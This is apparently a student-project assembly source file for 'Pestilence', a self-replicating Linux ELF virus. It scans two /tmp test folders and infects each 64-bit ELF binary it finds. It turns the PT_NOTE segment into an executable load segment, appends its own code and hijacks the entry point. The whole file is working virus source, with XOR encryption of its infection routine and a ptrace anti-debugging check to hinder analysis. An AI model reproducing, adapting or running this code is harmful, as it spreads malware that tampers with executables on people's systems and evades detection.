%include "main.inc"

section .text

_start:
	nop
	; https://stackoverflow.com/questions/29042713/self-modifying-code-sees-a-0xcc-byte-but-the-debugger-doesnt-show-it
begin:
	; save all registers
	push rax
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r8
	push r9
	push r10
	push r11

	call can_run_infection				; if (can_run_infection() == 0)
	cmp rax, 0					; 	goto .skipped;
	je .skipped					; ...

	call infection_routine				; infection_routine();

.skipped:
	; restore all registers
	pop r11
	pop r10
	pop r9
	pop r8
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
	pop rax
_jmp_instr:
	db 0xe9, 00, 00, 00, 00				; jump to default behavior of infected file
							; or to next instruction if original virus

	mov rax, SYS_EXIT				; exit(
	xor rdi, rdi					; 0
	syscall						; );

; int can_run_infection();
; rax can_run_infection();
can_run_infection:
	mov rax, SYS_PTRACE				; _ret = ptrace(
	mov rdi, PTRACE_TRACEME				; 	PTRACE_TRACEME,
	xor rsi, rsi					; 	0,
	xor rdx, rdx					; 	0
	syscall						; );
	cmp rax, 0					; if (_ret < 0)
	jl .debugged					; 	goto .debugged;

	; TODO: merge this uncipher with anti-debugger instructions
	call uncipher					; uncipher();

	; TODO: check file is really unciphered

	mov rax, 1					; return 1;
	ret

	.debugged:
		lea rdi, [rel debugged_message]		; print_string(debugged_message);
		call print_string			; ...
		xor rax, rax				; return 0;
		ret

; void uncipher()
uncipher:
	; this value will be modified when injected in a binary
	db 0xbf, 00, 00, 00, 00				; mov rdi, 0x0 => data = 0x0
	cmp rdi, 0x0					; if (data == 0x0)
	je .end						; 	goto .end;

	mov rax, rdi					; infection_routine_offset = data
	lea rdi, [rel begin]				; data = begin
	add rdi, rax					; data += infection_routine_offset

	mov rsi, cipher_stop - infection_routine	; size = cipher_stop - infection_routine
	lea rdx, [rel key]				; key = key
	call xor_cipher					; xor_cipher(data, size, key)

	.end:
		ret

; void xor_cipher(char *data, int size, char *key);
; xor_cipher(rdi data, rsi size, rdx key);
xor_cipher:
	push rdx					; save key

	.loop:
		cmp rsi, 0				; if (size == 0)
		je .end					; 	goto .end

		mov al, [rdi]				; al = *data
		mov bl, [rdx]				; bl = *key
		xor al, bl				; al ^= bl
		mov [rdi], al				; *data = al

		inc rdi					; data++
		inc rdx					; key++
		dec rsi					; size--

		cmp byte [rdx], 0			; if (*key == 0)
		je .key_reset				; 	goto .key_reset

		jmp .loop				; goto .loop

	.key_reset:
		mov rdx, [rsp]				; restore key
		jmp .loop				; goto .loop

	.end:
		pop rdx					; reset stack
		ret					; return

; void infection_routine()
infection_routine:
	lea rdi, [rel infected_folder_1]		; treate_folder(infected_folder_1);
	call treate_folder				; ...
	lea rdi, [rel infected_folder_2]		; treate_folder(infected_folder_2);
	call treate_folder				; ...
	ret

; void treate_folder(char const *_folder);
; void treate_folder(rdi folder);
treate_folder:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local folder:qword				; char const *folder;
	%local fd:qword					; long fd;
	%local cur_offset:qword				; long cur_offset;
	%local read_bytes:qword				; long read_bytes;
	%local cur_dirent:qword				; void *cur_dirent;
	%xdefine buf rbp - %$localsize - BUFFER_SIZE	; uint8_t buf[BUFFER_SIZE];
	%assign %$localsize %$localsize + BUFFER_SIZE	; ...

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [folder], rdi				; folder = _folder;

	; Open folder
	mov rax, SYS_OPEN				; _ret = open(
	mov rdi, [folder]				; folder_name,
	mov rsi, O_RDONLY				; O_RDONLY,
	xor rdx, rdx					; 0
	syscall						; );
	cmp rax, 0					; if (_ret < 0)
	jl .end						; 	goto .end
	mov [fd], rax					; fd = _ret;

.begin_getdents_loop:					; while (true) {
	mov rax, SYS_GETDENTS64				; _ret = SYS_GETDENTS64(
	mov rdi, [fd]					; 	fd,
	lea rsi, [buf]					; 	buf,
	mov rdx, BUFFER_SIZE				; 	BUFFER_SIZE
	syscall						; );

	cmp rax, 0					; if (_ret <= 0)
	jle .end_getdents_loop				;	 break;
	mov [read_bytes], rax				; read_bytes = _ret;

	xor rax, rax					; cur_offset = 0;
	mov [cur_offset], rax				; ...

.begin_treate_loop:					; do {
	lea rax, [buf]					; cur_dirent = buf + cur_offset;
	add rax, [cur_offset]				; ...
	mov [cur_dirent], rax				; ...

	mov rdi, [folder]				; treat_file(folder;
	mov rsi, [cur_dirent]				; 	cur_dirent
	add rsi, linux_dirent64.d_name			; 		->d_name
	call treat_file					; );

	mov rax, [cur_dirent]				; _reclen_ptr = cur_dirent->d_reclen;
	add rax, linux_dirent64.d_reclen		; ...
	xor rdi, rdi					; _reclen = *_reclen_ptr;
	mov di, [rax]					; ...
	add [cur_offset], rdi				; cur_offset += _reclen;

	mov rax, [cur_offset]				; } while (cur_offset == read_bytes);
	cmp rax, [read_bytes]				; ...
	je .end_treate_loop				; ...
	jmp .begin_treate_loop				; ...
.end_treate_loop:					; ...

	jmp .begin_getdents_loop
.end_getdents_loop:					; }

	; Close folder
	mov rax, SYS_CLOSE				; _ret = close(
	mov rdi, [fd]					;	fd
	syscall						; );

.end:
	add rsp, %$localsize
	pop rbp
	%pop
	ret

; void treat_file(char const *_dirname, char const *_filename);
; void treat_file(rdi dirname, rsi filename);
treat_file:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local dirname:qword				; char const *dirname;
	%local filename:qword				; char const *file;
	%local filepath:qword				; char *filepath;
	%local fd:qword					; long fd;
	%local filesize:qword				; long filesize;
	%local mappedfile:qword				; void *mappedfile;
	%local payload_offset:qword			; long payload_offset;
	%local new_vaddr:qword				; Elf64_addr new_vaddr;
	%local payload_size:qword			; long payload_size;
	%local offset_to_sub_mmap:qword			; long offset_to_sub_mmap;
	%xdefine pathbuf rbp - %$localsize - PATH_MAX	; uint8_t pathbuf[PATH_MAX];
	%assign %$localsize %$localsize + PATH_MAX	; ...
	%xdefine buf rbp - %$localsize - BUFFER_SIZE	; uint8_t buf[BUFFER_SIZE];
	%assign %$localsize %$localsize + BUFFER_SIZE	; ...

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [dirname], rdi				; dirname = _dirname;
	mov [filename], rsi				; filename = _filename;

	xor r8, r8					; len = 0;
	lea rdi, [pathbuf]				; dest = pathbuf;
	mov rsi, [dirname]				; src = dirname;
	.dirname:
		inc r8					; len++;
		cmp r8, PATH_MAX			; if (len == PATH_MAX)
		je .end					; 	goto .end;
		movsb					; *dest++ = *src++;
		cmp byte [rsi], 0			; if (*src != 0)
		jnz .dirname				; 	goto .dirname;

	mov rsi, [filename]				; src = filename;
	.filename:
		inc r8					; len++;
		cmp r8, PATH_MAX			; if (len == PATH_MAX)
		je .end					; 	goto .end;
		movsb					; *dest++ = *src++;
		cmp byte [rsi], 0			; if (*src != 0)
		jnz .filename				; 	goto .filename;
	
	mov byte [rdi], 0				; *dest = 0;
	

	; Open file
	mov rax, SYS_OPEN				; _ret = open(
	lea rdi, [pathbuf]				; path,
	mov rsi, O_RDWR					; O_RDWR,
	xor rdx, rdx					; 0
	syscall						; );
	cmp rax, 0					; if (_ret < 0)
	jl .end						; 	goto .end
	mov [fd], rax					; fd = _ret;

	; Get file stat
	lea rsi, [buf]					; _stat = buf;
	mov rax, SYS_FSTAT				; _ret = fstat(
	mov rdi, [fd]					; 	fd,
	syscall						; _stat);
	cmp rax, -1					; if (_ret == -1)
	je .close_file					; 	goto .close_file

	add rsi, stat.st_size				; filesize = _stat->st_size;
	mov rax, [rsi]					; ...
	mov [filesize], rax				; ...
	cmp rax, MINIMAL_FILE_SIZE			; if (filesize < MINIMAL_FILE_SIZE)
	jl .close_file					; 	goto .close_file

	; Reserve file size + payload size (for PT_NOTE method)
	; https://stackoverflow.com/questions/15684771/how-to-portably-extend-a-file-accessed-using-mmap
	mov rax, SYS_MMAP				; _ret = mmap(
	xor rdi, rdi					; 	0,
	mov rsi, [filesize]				; 	filesize + (_end - _start),
	add rsi, _end - _start				;	...
	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
	mov r10, MAP_PRIVATE | MAP_ANONYMOUS		; 	MAP_PRIVATE | MAP_ANONYMOUS,
	mov r8, -1					; 	-1,
	xor r9, r9					; 	0
	syscall						; );
	cmp rax, MMAP_ERRORS				; if (_ret == MMAP_ERRORS)
	je .close_file					; 	goto .close_file
	mov [mappedfile], rax				; mappedfile = _ret;

	; Map file
	mov rax, SYS_MMAP				; _ret = mmap(
	mov rdi, [mappedfile]				; 	mappedfile,
	mov rsi, [filesize]				; 	filesize,
	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
	mov r10, MAP_SHARED | MAP_FIXED			; 	MAP_SHARED | MAP_FIXED,
	mov r8, [fd]					; 	fd,
	xor r9, r9					; 	0
	syscall						; );
	cmp rax, MMAP_ERRORS				; if (_ret == MMAP_ERRORS)
	je .close_file					; 	goto .close_file
	mov [mappedfile], rax				; mappedfile = _ret;

	; Check if file is an ELF 64
	mov rdi, [mappedfile]				; is_elf_64(mappedfile);
	call is_elf_64					; ...
	cmp rax, 1					; if (is_elf_64(mappedfile) != 1)
	jne .unmap_file					; 	goto .unmap_file

	; Check if file has a signature
	mov rdi, [mappedfile]				; if (has_signature(mappedfile) == 1)
	call has_signature				; ...
	cmp rax, 1					; ...
	je .unmap_file					; 	goto .unmap_file

	mov rax, [filesize]				; payload_offset = filesize;
	mov [payload_offset], rax			; ...
	mov rdi, [mappedfile]				; _new_vaddr = get_next_available_vaddr(mappedfile);
	call get_next_available_vaddr			; ...

	; Align new_vaddr to offset in file such as offset = vaddr % PAGE_SIZE
	mov rdi, [payload_offset]			; _offset_from_page = payload_offset;
	and rdi, OFFSET_FROM_PAGE_MASK			; _offset_from_page &= OFFSET_FROM_PAGE_MASK
	add rax, rdi					; _injected_segment_start += _offset_from_page;
	mov [new_vaddr], rax				; new_vaddr = _new_vaddr;

	mov rdi, _end - begin				; payload_size = _end - begin;
	mov [payload_size], rdi				; ...

	; TODO rcx peut être différent de r8 si on fait de la compression
	mov rdi, [mappedfile]				; ret = convert_pt_note_to_load(mappedfile,
	mov rsi, [payload_offset]			; payload_offset,
	mov rdx, [new_vaddr]				; next_vaddr,
	mov rcx, [payload_size]				; payload_size,
	mov r8, [payload_size]				; payload_size,
	call convert_pt_note_to_load			; );
	cmp rax, 0					; if (ret == 0)
	je .unmap_file					; 	goto .unmap_file

	mov rax, SYS_FTRUNCATE				; _ret = ftruncate(
	mov rdi, [fd]					; fd,
	mov rsi, [filesize]				; filesize
	add rsi, [payload_size]				; + payload_size
	syscall						; );
	cmp rax, 0					; if (_ret < 0)
	jl .unmap_file					; 	goto .unmap_file

	; Get address of the start of the current page
	xor rdx, rdx					; _offset = old_filesize / page_size
	mov rax, [filesize]				; ...
	mov rdi, PAGE_SIZE				; ...
	div rdi						; ...
	mul rdi						; _offset *= page_size;
	mov [offset_to_sub_mmap], rax			; offset_to_sub_mmap = _offset;
	mov rdi, [mappedfile]				; _addr = mapped_file
	add rdi, rax					; _addr += _offset

	mov rax, SYS_MMAP				; _ret = mmap(
							;	_addr,
	mov rsi, [filesize]				; 	filesize
	sub rsi, [offset_to_sub_mmap]			;	  - offset_to_sub_mmap,
	add rsi, [payload_size]				;	  + payload_size
	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
	mov r10, MAP_SHARED | MAP_FIXED			; 	MAP_SHARED | MAP_FIXED,
	mov r8, [fd]					; 	fd,
	mov r9, [offset_to_sub_mmap]			;	offset_to_sub_mmap
	syscall						; );
	cmp rax, MMAP_ERRORS				; if (_ret == MMAP_ERRORS)
	je .unmap_file					; 	goto .unmap_file

	; copy all bytes between _start and _end to the segment
	mov rdi, [mappedfile]				; dest = file_map + filesize;
	add rdi, [filesize]				; ...
	lea rsi, [rel begin]				; src = begin; //TODO Fuck lldb
	mov rcx, _end - begin				; len = _end - begin;
	rep movsb					; memcpy(dest, src, len);
	
	; compute jmp_value
	mov rdi, [mappedfile]				; _jmp_value = file_map
	add rdi, elf64_hdr.e_entry			; 	->e_entry;
	mov eax, [rdi]					; ...

	sub eax, [new_vaddr]				; _jmp_value -= new_vaddr;
	sub eax, _jmp_instr - begin			; _jmp_value -= _jmp_instr - begin;
	sub eax, 5					; _jmp_value -= 5; // Size of jmp instruction

	; change jmp_value in injected code
	mov rdi, [mappedfile]				; jmp_value_ptr = file_map + filesize + (_end - _start) - 8 (8 is the size of the jmp_value variable);
	add rdi, [filesize]				; 	+ filesize
	add rdi, _jmp_instr - begin			; 	+ (_jmp_inst - begin)
	inc rdi						; 	+ 1;
	mov [rdi], eax					; *jmp_value_ptr = _jmp_value;

	mov rdi, [mappedfile]				; _e_entry = &mappedfile->e_entry;
	add rdi, elf64_hdr.e_entry			; ...
	mov rax, [new_vaddr]				; *_e_entry = new_vaddr;
	mov [rdi], rax					; ...

	; xor cipher all injected bytes between infection_routine and cipher_stop
	mov rdi, [mappedfile]				; data = file_map + filesize + (infection_routine - begin);
	add rdi, [filesize]				;
	add rdi, infection_routine - begin		;
	mov rsi, cipher_stop - infection_routine	; size = cipher_stop - infection_routine
	lea rdx, [rel key]				; key = key
	call xor_cipher					; xor_cipher(data, size, key)

	; change cipher address in injected code (uncipher)
	mov eax, infection_routine - begin		; infection_routine_offset = infection_routine - begin;
	mov rdi, [mappedfile]				; uncipher_ptr = file_map + filesize + (uncipher - begin);
	add rdi, [filesize]				;
	add rdi, uncipher - begin			;
	inc rdi						; 	+ 1;
	mov [rdi], eax					; *uncipher_ptr = infection_routine_offset;


.unmap_file:
	mov rax, SYS_MUNMAP				; _ret = munmap(
	mov rdi, [mappedfile]				; 	mappedfile,
	mov rsi, [filesize]				; 	filesize
	syscall						; );

.close_file:
	mov rax, SYS_CLOSE				; _ret = close(
	mov rdi, [fd]					;	fd
	syscall						; );

.end:
	add rsp, %$localsize
	pop rbp
	%pop
	ret

; Elf64_Addr get_next_available_vaddr(char const *file_map);
; rax get_next_available_vaddr(rdi file_map);
get_next_available_vaddr:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local file_map:qword				; char const *file_map;
	%local furthest_segment_end:qword		; Elf64_Addr furthest_segment_end;
	%local e_phoff:qword				; long e_phoff;
	%local e_phentsize:word				; short e_phentsize;
	%local e_phnum:word				; short e_phnum;

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [file_map], rdi				; file_map = _file_map;
	mov rax, [rdi + elf64_hdr.e_phoff]		; e_phoff = elf64_hdr->e_phoff;
	mov [e_phoff], rax				; ...
	mov ax, [rdi + elf64_hdr.e_phentsize]		; e_phentsize = elf64_hdr->e_phentsize;
	mov [e_phentsize], ax				; ...
	mov ax, [rdi + elf64_hdr.e_phnum]		; e_phnum = elf64_hdr->e_phnum;
	mov [e_phnum], ax				; ...

	mov QWORD [furthest_segment_end], 0		; furthest_segement_end = 0;

	; loop through program headers
	xor rsi, rsi					; i = 0;
	.begin_phdr_loop:				; do {
		mov rax, [file_map]			; _cur_phdr = file_map
		add rax, [e_phoff]			; 	+ elf64_hdr.e_phoff
		mov rcx, [e_phentsize]			; 	+ i * elf64_hdr.e_phentsize
		imul rcx, rsi				; 		...
		add rax, rcx				; 		...

		mov rdi, rax				; _cur_furthest = _cur_phdr->p_vaddr
		add rdi, elf64_phdr.p_vaddr		; ...
		mov r8, [rdi]				; ...

		mov rdi, rax				; _cur_furthest += _cur_phdr->p_memsz
		add rdi, elf64_phdr.p_memsz		; ...
		add r8, [rdi]				; ...

		mov r9, [furthest_segment_end]		; _furthest_segment_end = furthest_segment_end
		cmp r8, r9				; if (_cur_furthest > _furthest_segment_end)
		cmova r9, r8				;	_furthest_segment_end = _cur_furthest;
		mov [furthest_segment_end], r9		; ...

		inc rsi					; i++;
		cmp si, [e_phnum]			; } while (i != e_phnum);
		jne .begin_phdr_loop			; ...

	; Round up to next multiple of PAGE_SIZE
	mov rax, [furthest_segment_end]			; _next_available_vaddr = furthest_segment_end;
	xor r8, r8					; _offset_to_align = 0
	mov r9, PAGE_SIZE				; _new_offset_to_align = PAGE_SIZE
	test rax, OFFSET_FROM_PAGE_MASK			; if (_furthest_segment_end & OFFSET_FROM_PAGE_MASK == 0)
	cmovnz r8, r9					;	_offset_to_align = _new_offset_to_align
	mov r9, OFFSET_FROM_PAGE_MASK			; _alignment_mask = OFFSET_FROM_PAGE_MASK
	not r9						; _alignment_mask = ~alignement_mask;
	and rax, r9					; _next_available_vaddr &= _alignement_mask;
	add rax, r8					; _next_available_vaddr += _new_offset_to_align;

	add rsp, %$localsize
	pop rbp
	%pop
	ret						; return _next_available_vaddr;
	

; int is_elf_64(char const *file_map);
; rax is_elf_64(rdi file_map);
is_elf_64:
	xor rsi, rsi					; counter = 0;
	.begin_magic_loop:				; while (true) {
		mov al, [rdi + rsi]			; 	_c = file_map[counter];
		lea r8, [rel elf_64_magic]
		mov bl, [r8+rsi]				; 	_magic_c = elf_64_magic[counter];
		cmp al, bl				; 	if (_c != _magic_c)
		jne .end_not_equal			; 		goto end_not_equal;
		inc rsi					; 	counter++;
		cmp rsi, len_elf_64_magic		; 	if (counter == len_elf_64_magic)
		je .end_equal				; 		goto end_equal;
		jmp .begin_magic_loop			; }
	
	.end_not_equal:
		xor rax, rax				; return 0;
		ret

	.end_equal:
		mov rax, 1				; return 1;
		ret

;elf64_phdr *find_note_segment(char const *_file_map)
;rax find_note_segment(rdi file_map);
find_note_segment:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local file_map:qword				; char const *file_map;
	%local res_header:qword				; elf64_phdr *res_header;
	%local e_phoff:qword				; long e_phoff;
	%local e_phentsize:qword			; long e_phentsize;
	%local e_phnum:qword				; long e_phnum;

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [file_map], rdi				; file_map = _file_map;
	mov rax, [rdi + elf64_hdr.e_phoff]		; e_phoff = elf64_hdr.e_phoff;
	mov [e_phoff], rax				; ...
	xor rax, rax
	mov ax, [rdi + elf64_hdr.e_phentsize]		; e_phentsize = elf64_hdr.e_phentsize;
	mov [e_phentsize], rax				; ...
	xor rax, rax
	mov ax, [rdi + elf64_hdr.e_phnum]		; e_phnum = elf64_hdr.e_phnum;
	mov [e_phnum], rax				; ...

	; loop through program headers
	xor rsi, rsi					; i = 0;
	.begin_phdr_loop:				; while (true) {
		mov rax, [file_map]			; cur_phdr = file_map
		add rax, [e_phoff]			; 	+ elf64_hdr.e_phoff
		mov rcx, [e_phentsize]			; 	+ i * elf64_hdr.e_phentsize
		imul rcx, rsi				; 		...
		add rax, rcx				; 		...
		mov [res_header], rax			; res_header = cur_phdr;

		; check if PT_NOTE
		mov rdi, [res_header]			; if (cur_phdr->p_type != PT_NOTE)
		add rdi, elf64_phdr.p_type		; ...
		mov eax, [rdi]				; ...
		cmp eax, PT_NOTE			; ...
		jne .next_phdr_loop			; 	goto next_phdr_loop;

		jmp .found				; goto found;

	.next_phdr_loop:
		inc rsi					; i++;
		cmp rsi, [e_phnum]			; if (i == e_phnum)
		je .not_found				; 	goto not_found;
		jmp .begin_phdr_loop			; }

	.not_found:
		xor rax, rax				; res = 0;
		jmp .end				; goto end

	.found:
		mov rax, [res_header]			; res = res_header;
		jmp .end				; goto end

.end:
	add rsp, %$localsize
	pop rbp
	%pop
	ret						; return res;


; int has_signature(char const *file_map)
; rax has_signature(rdi file_map);
has_signature:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local file_map:qword				; char const *file_map;
	%local e_phoff:qword				; long e_phoff;
	%local e_phentsize:qword			; long e_phentsize;
	%local e_phnum:qword				; long e_phnum;

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [file_map], rdi				; file_map = _file_map;
	mov rax, [rdi + elf64_hdr.e_phoff]		; e_phoff = elf64_hdr.e_phoff;
	mov [e_phoff], rax				; ...
	xor rax, rax
	mov ax, [rdi + elf64_hdr.e_phentsize]		; e_phentsize = elf64_hdr.e_phentsize;
	mov [e_phentsize], rax				; ...
	xor rax, rax
	mov ax, [rdi + elf64_hdr.e_phnum]		; e_phnum = elf64_hdr.e_phnum;
	mov [e_phnum], rax				; ...

	; loop through program headers
	xor rsi, rsi					; i = 0;
	.begin_phdr_loop:				; while (true) {
		mov rax, [file_map]			; cur_phdr = file_map
		add rax, [e_phoff]			; 	+ elf64_hdr.e_phoff
		mov rcx, [e_phentsize]			; 	+ i * elf64_hdr.e_phentsize
		imul rcx, rsi				; 		...
		add rax, rcx				; 		...

		; check if PF_PESTILENCE
		mov rdi, rax				; if (!(cur_phdr->p_flag & PF_PESTILENCE))
		add rdi, elf64_phdr.p_flags		; ...
		mov eax, [rdi]				; ...
		and eax, PF_PESTILENCE			; ...
		cmp eax, PF_PESTILENCE			; ...
		jne .next_phdr_loop			; 	goto next_phdr_loop;

		jmp .found				; goto found;

	.next_phdr_loop:
		inc rsi					; i++;
		cmp rsi, [e_phnum]			; if (i == e_phnum)
		je .not_found				; 	goto not_found;
		jmp .begin_phdr_loop			; }

	.not_found:
		xor rax, rax				; res = 0;
		jmp .end				; goto end

	.found:
		mov rax, 1				; res = 1;
		jmp .end				; goto end

.end:
	add rsp, %$localsize
	pop rbp
	%pop
	ret						; return res;

; bool convert_pt_note_to_load(char const *_file_map,
;			       Elf64_Off _new_offset,
;			       Elf64_Addr _new_vaddr,
;			       uint64_t _filesz,
;			       uint64_t _memsz)
; bool convert_pt_note_to_load(rdi _file_map,
;			       rsi _new_offset,
;			       rdx _new_vaddr,
;			       rcx _filesz,
;			       r8 _memsz);
convert_pt_note_to_load:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local file_map:qword				; char const *file_map;
	%local new_offset:qword				; Elf64_Off new_offset;
	%local new_vaddr:qword				; Elf64_Addr new_vaddr;
	%local filesz:qword				; uint64_t filesz;
	%local memsz:qword				; uint64_t memsz;
	%local note_segment:qword			; elf64_phdr *note_segment;

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [file_map], rdi				; file_map = _file_map;
	mov [new_offset], rsi				; new_offset = _new_offset;
	mov [new_vaddr], rdx				; new_vaddr = _new_vaddr;
	mov [filesz], rcx				; new_filesz = _new_filesz;
	mov [memsz], r8					; new_memsz = _new_memsz;

	call find_note_segment				; _ret = find_note_seggment(file_map);
	cmp rax, 0					; if (_ret == NULL)
	je .err						; 	goto .end_err;

	mov rdi, rax					; _type_ptr = &_note_segment->p_flags;
	add rdi, elf64_phdr.p_type			; ...
	mov DWORD [rdi], PT_LOAD			; *_type_ptr = PT_LOAD;

	mov rdi, rax					; _flags_ptr = _note_segment->p_flags;
	add rdi, elf64_phdr.p_flags			; ...
	mov DWORD [rdi], PF_X | PF_R | PF_W | PF_PESTILENCE	; *_flags_ptr = PF_X | PF_R | PF_W | PF_PESTILENCE;

	mov rdi, rax					; _offset_ptr = _note_segment->p_offset;
	add rdi, elf64_phdr.p_offset			; ...
	mov rsi, [new_offset]				; *_offset_ptr = new_offset;
	mov [rdi], rsi					; ...

	mov rdi, rax					; _vaddr_ptr = _note_segment->p_vaddr;
	add rdi, elf64_phdr.p_vaddr			; ...
	mov rsi, [new_vaddr]				; *_vaddr_ptr = new_vaddr;
	mov [rdi], rsi					; ...

	mov rdi, rax					; _paddr_ptr = _note_segment->p_paddr;
	add rdi, elf64_phdr.p_paddr			; ...
	mov rsi, [new_vaddr]				; *_paddr_ptr = new_vaddr;
	mov [rdi], rsi					; ...

	mov rdi, rax					; _filesz_ptr = _note_segment->p_filesz;
	add rdi, elf64_phdr.p_filesz			; ...
	mov rsi, [filesz]				; *_filesz_ptr = filesz;
	mov [rdi], rsi					; ...

	mov rdi, rax					; _memsz_ptr = _note_segment->p_memsz;
	add rdi, elf64_phdr.p_memsz			; ...
	mov rsi, [memsz]				; *_memsz_ptr = memsz;
	mov [rdi], rsi					; ...

	mov rdi, rax					; _align_ptr = _note_segment->p_align;
	add rdi, elf64_phdr.p_align			; ...
	mov QWORD [rdi], PAGE_SIZE			; *_align_ptr = PAGE_SIZE;

	jmp .success

.err:
	xor rax, rax					; _ret = false;
	jmp .end					; goto .end

.success:
	mov rax, 1					; _ret = true;

.end:
	add rsp, %$localsize
	pop rbp
	%pop
	ret						; return _ret;

; void print_string(char const *str);
; void print_string(rdi str);
print_string:
	push rdi					; save str
	xor rdx, rdx					; _len = 0;
	.begin_strlen_loop:				; while (true) {
		mov sil, [rdi]				; _c = *_str;
		cmp sil, 0				; if (_c == 0)
		je .end_strlen_loop			; 	break;
		inc rdx					; _len++
		inc rdi					; _str++;
		jmp .begin_strlen_loop			; }
	.end_strlen_loop:				; ...
	pop rsi						; load str
	mov rax, SYS_WRITE				; write(
	mov rdi, 1					; 	1,
	syscall						;	str, _len);
	mov rax, SYS_WRITE				; write(
	mov rdi, 1					; 	1, 
	push 0x0A					; 	'\n',
	mov rsi, rsp					; 	...
	mov rdx, 1					; 	1
	syscall						; );
	add rsp, 8					; unpop '\n'

	ret

section .data
	infected_folder_1: db "/tmp/test/", 0
	infected_folder_2: db "/tmp/test2/", 0
	elf_64_magic: db 0x7F, "ELF", 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0
	len_elf_64_magic: equ $ - elf_64_magic
cipher_stop:
	key db "S3cr3tK3y", 0
	debugged_message: db "DEBUG DETECTED, dommage ;) !", 0
	; never used but here to be copied in the binary
	signature: db "Pestilence v1.0 by jmaia and dhubleur"

_end:
